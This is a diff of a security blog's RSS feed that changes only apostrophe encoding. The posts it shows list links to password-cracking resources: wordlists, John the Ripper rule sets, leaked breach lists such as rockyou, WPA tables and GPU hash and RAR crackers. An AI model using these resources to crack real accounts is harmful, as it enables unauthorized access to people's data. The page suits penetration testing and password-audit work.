 &lt;p&gt;They have some very similar lists of features, your mileage may vary. But they basically parse files and web pages for words and generate password lists based on the words found.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-02-11 08:01 by Rob Fuller&lt;/p&gt;
-&lt;p&gt;Korelogic&#39;s password lists: &lt;a href=&#34;http://contest.korelogic.com/wordlists.html&#34;&gt;http://contest.korelogic.com/wordlists.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Korelogic&#39;s John rule set: &lt;a href=&#34;http://contest.korelogic.com/rules.html&#34;&gt;http://contest.korelogic.com/rules.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Korelogic&amp;rsquo;s password lists: &lt;a href=&#34;http://contest.korelogic.com/wordlists.html&#34;&gt;http://contest.korelogic.com/wordlists.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Korelogic&amp;rsquo;s John rule set: &lt;a href=&#34;http://contest.korelogic.com/rules.html&#34;&gt;http://contest.korelogic.com/rules.html&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2010-03-30 05:00 by Rob Fuller&lt;/p&gt;
 &lt;p&gt;I missed one hell of a treasure trove of word lists:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://trac.kismac-ng.org/wiki/wordlists&#34;&gt;http://trac.kismac-ng.org/wiki/wordlists&lt;/a&gt;&lt;/p&gt;
@@ -689,7 +689,7 @@ Wyd - &lt;a href=&#34;http://www.remote-exploit.org/codes_wyd.html&#34;&gt;http:
 &lt;li&gt;&lt;a href=&#34;http://www.skullsecurity.org/wiki/index.php/Passwords&#34;&gt;http://www.skullsecurity.org/wiki/index.php/Passwords&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;hotmail: &lt;a href=&#34;http://current.com/technology/91108676_email-password-leak-update-gmail-yahoo-aol-and-hotmail-hit-too.htm&#34;&gt;http://current.com/technology/91108676_email-password-leak-update-gmail-yahoo-aol-and-hotmail-hit-too.htm&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;rockyou: &lt;a href=&#34;http://securitystream.info/data-breaches/easy-passwords-found-in-rockyou-data-leak/&#34;&gt;http://securitystream.info/data-breaches/easy-passwords-found-in-rockyou-data-leak/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt; (Kevin&#39;s Word Lists)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt; (Kevin&amp;rsquo;s Word Lists)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://www.phenoelit-us.org/dpl/dpl.html&#34;&gt;http://www.phenoelit-us.org/dpl/dpl.html&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://www.offensive-security.com/wpa-tables/wpalist.txt.tar.bz2&#34;&gt;http://www.offensive-security.com/wpa-tables/wpalist.txt.tar.bz2&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://www.renderlab.net/projects/WPA-tables/&#34;&gt;http://www.renderlab.net/projects/WPA-tables/&lt;/a&gt;&lt;/li&gt;
@@ -703,10 +703,10 @@ Wyd - &lt;a href=&#34;http://www.remote-exploit.org/codes_wyd.html&#34;&gt;http:
       <pubDate>Fri, 18 Sep 2009 01:44:39 +0000</pubDate>
       
       <guid>https://malicious.link/post/2009/2009-09-18-gpu-hash-password-cracking/</guid>
-      <description>&lt;p&gt;I recently upgraded my video card and had a rough time finding programs that fit the hype of GPU password cracking, so here is what I found so that you won&#39;t have as hard a time.&lt;/p&gt;
-&lt;p&gt;Ivan Golubev&#39;s SHA1/MD5/MD4 cracker: &lt;a href=&#34;http://www.golubev.com/hashgpu.htm&#34;&gt;&lt;br&gt;
+      <description>&lt;p&gt;I recently upgraded my video card and had a rough time finding programs that fit the hype of GPU password cracking, so here is what I found so that you won&amp;rsquo;t have as hard a time.&lt;/p&gt;
+&lt;p&gt;Ivan Golubev&amp;rsquo;s SHA1/MD5/MD4 cracker: &lt;a href=&#34;http://www.golubev.com/hashgpu.htm&#34;&gt;&lt;br&gt;
 http://www.golubev.com/hashgpu.htm&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Ivan Golubev&#39;s RAR pass cracker:&lt;br&gt;
+&lt;p&gt;Ivan Golubev&amp;rsquo;s RAR pass cracker:&lt;br&gt;
 &lt;a href=&#34;http://www.golubev.com/rargpu.htm&#34;&gt;http://www.golubev.com/rargpu.htm&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;CUDA Multiforcer (down at the time of this posting)&lt;br&gt;
 &lt;a href=&#34;http://www.cryptohaze.com/bruteforcers.php&#34;&gt;http://www.cryptohaze.com/bruteforcers.php&lt;/a&gt;&lt;/p&gt;
